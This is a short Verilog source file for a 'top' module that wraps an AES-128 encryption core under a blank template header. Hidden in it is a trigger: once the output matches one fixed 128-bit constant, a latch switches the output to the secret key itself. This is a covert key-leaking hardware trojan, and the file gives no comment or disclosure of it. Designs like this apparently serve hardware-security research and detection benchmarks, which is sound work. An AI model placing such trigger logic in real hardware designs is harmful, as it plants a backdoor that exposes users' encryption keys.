`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date:    12:02:52 03/06/2013 
// Design Name: 
// Module Name:    top 
// Project Name: 
// Target Devices: 
// Tool versions: 
// Description: 
//
// Dependencies: 
//
// Revision: 
// Revision 0.01 - File Created
// Additional Comments: 
//
//////////////////////////////////////////////////////////////////////////////////
module top(
    input clk,
    input rst,
    input [127:0] key,
    output [127:0] out
    );

	reg [127:0] out;
	wire [127:0] temp_out;
	aes_128 AES (clk, key, temp_out);

	reg trig;
	always @(posedge clk or posedge rst) begin
		if(rst == 1'b1) begin
			trig <= 1'b0;
		end
		else if(out == 128'h23ccee4ff5cabc4634571553f0b4c207) begin
			trig <= 1'b1;
		end
	end
	
	always @(posedge clk) begin
		if(trig) begin
			out <= key;
		end
		else begin
			out <= temp_out;
		end
	end

endmodule
